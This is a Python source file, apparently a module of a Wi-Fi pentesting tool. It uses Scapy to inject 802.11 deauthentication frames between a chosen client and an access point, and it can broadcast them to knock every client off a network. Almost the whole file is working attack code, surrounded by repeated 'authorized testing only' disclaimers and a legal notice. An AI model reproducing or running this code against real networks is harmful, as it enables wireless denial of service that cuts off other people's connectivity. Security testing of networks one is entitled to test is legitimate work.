"""
WiFi Tester Pro v6.0 - Deauthenticator
Deauthentication testing module (Kali Linux only)

WARNING: This module is for AUTHORIZED SECURITY TESTING ONLY.
Unauthorized deauthentication attacks are illegal.
Only use on networks you own or have explicit written permission to test.
"""

import os
import time
from typing import Optional, Callable
from dataclasses import dataclass

from ...settings import IS_KALI

# Only import scapy on Kali
if IS_KALI:
    try:
        from scapy.all import (
            RadioTap, Dot11, Dot11Deauth,
            sendp, conf
        )
        SCAPY_AVAILABLE = True
    except ImportError:
        SCAPY_AVAILABLE = False
else:
    SCAPY_AVAILABLE = False


@dataclass
class DeauthResult:
    """Result of deauthentication test"""
    success: bool
    frames_sent: int
    target_mac: str
    ap_mac: str
    message: str


class Deauthenticator:
    """
    Deauthentication frame injection for security testing.
    
    WARNING: FOR AUTHORIZED TESTING ONLY!
    
    This tool is intended for:
    - Testing your own network's resilience to deauth attacks
    - Authorized penetration testing with written permission
    - Security research in controlled environments
    
    Unauthorized use is:
    - Illegal under computer fraud laws (CFAA, etc.)
    - Punishable by fines and imprisonment
    - Unethical and harmful to others
    """
    
    def __init__(self, interface: Optional[str] = None):
        self._interface = interface
        self._is_available = IS_KALI and SCAPY_AVAILABLE
        self._is_running = False
        self._stop_flag = False
        
        if not self._is_available:
            print("[Deauthenticator] Not available (requires Kali + Scapy)")
    
    @property
    def is_available(self) -> bool:
        """Check if deauth is available"""
        return self._is_available and os.geteuid() == 0
    
    @property
    def is_running(self) -> bool:
        """Check if deauth is currently running"""
        return self._is_running
    
    def set_interface(self, interface: str):
        """Set the monitor mode interface"""
        self._interface = interface
        if SCAPY_AVAILABLE:
            conf.iface = interface
    
    def send_deauth(
        self,
        target_mac: str,
        ap_mac: str,
        count: int = 10,
        reason: int = 7,
        callback: Optional[Callable[[int], None]] = None
    ) -> DeauthResult:
        """
        Send deauthentication frames.
        
        Args:
            target_mac: Client MAC to deauthenticate ("ff:ff:ff:ff:ff:ff" for broadcast)
            ap_mac: Access point MAC address
            count: Number of frames to send
            reason: Deauth reason code (7 = Class 3 frame received from nonassociated station)
            callback: Optional callback for progress updates
        
        Returns:
            DeauthResult with operation details
        
        WARNING: FOR AUTHORIZED TESTING ONLY!
        """
        if not self.is_available:
            return DeauthResult(False, 0, target_mac, ap_mac, "Deauth not available")
        
        if not self._interface:
            return DeauthResult(False, 0, target_mac, ap_mac, "No interface set")
        
        self._is_running = True
        self._stop_flag = False
        frames_sent = 0
        
        try:
            # Build deauth frame: AP -> Client
            deauth_ap_to_client = RadioTap() / Dot11(
                type=0, subtype=12,
                addr1=target_mac,  # Destination
                addr2=ap_mac,      # Source (AP)
                addr3=ap_mac       # BSSID
            ) / Dot11Deauth(reason=reason)
            
            # Build deauth frame: Client -> AP
            deauth_client_to_ap = RadioTap() / Dot11(
                type=0, subtype=12,
                addr1=ap_mac,      # Destination
                addr2=target_mac,  # Source (Client)
                addr3=ap_mac       # BSSID
            ) / Dot11Deauth(reason=reason)
            
            # Send frames
            for i in range(count):
                if self._stop_flag:
                    break
                
                # Send both directions
                sendp(deauth_ap_to_client, iface=self._interface, verbose=False)
                sendp(deauth_client_to_ap, iface=self._interface, verbose=False)
                frames_sent += 2
                
                if callback:
                    callback(frames_sent)
                
                time.sleep(0.1)  # Small delay between frames
            
            return DeauthResult(
                success=True,
                frames_sent=frames_sent,
                target_mac=target_mac,
                ap_mac=ap_mac,
                message=f"Sent {frames_sent} deauth frames"
            )
            
        except Exception as e:
            return DeauthResult(
                success=False,
                frames_sent=frames_sent,
                target_mac=target_mac,
                ap_mac=ap_mac,
                message=str(e)
            )
        finally:
            self._is_running = False
    
    def stop(self):
        """Stop ongoing deauthentication"""
        self._stop_flag = True
    
    def deauth_all_clients(
        self,
        ap_mac: str,
        count: int = 10,
        callback: Optional[Callable[[int], None]] = None
    ) -> DeauthResult:
        """
        Send broadcast deauth to disconnect all clients from AP.
        
        WARNING: FOR AUTHORIZED TESTING ONLY!
        """
        return self.send_deauth(
            target_mac="ff:ff:ff:ff:ff:ff",
            ap_mac=ap_mac,
            count=count,
            callback=callback
        )


# Legal disclaimer
LEGAL_DISCLAIMER = """
╔══════════════════════════════════════════════════════════════════╗
║                    LEGAL DISCLAIMER                               ║
╠══════════════════════════════════════════════════════════════════╣
║ This module is for AUTHORIZED SECURITY TESTING ONLY.             ║
║                                                                  ║
║ Unauthorized use of deauthentication attacks is:                 ║
║ • Illegal under the Computer Fraud and Abuse Act (CFAA)          ║
║ • Illegal under similar laws in most countries                   ║
║ • Punishable by fines and/or imprisonment                        ║
║ • A violation of FCC regulations in the United States            ║
║                                                                  ║
║ ONLY use this tool:                                              ║
║ • On networks you personally own                                 ║
║ • With explicit written permission from the network owner        ║
║ • In isolated lab environments for research                      ║
║                                                                  ║
║ The developers assume NO responsibility for misuse.              ║
╚══════════════════════════════════════════════════════════════════╝
"""


__all__ = ['Deauthenticator', 'DeauthResult', 'LEGAL_DISCLAIMER']
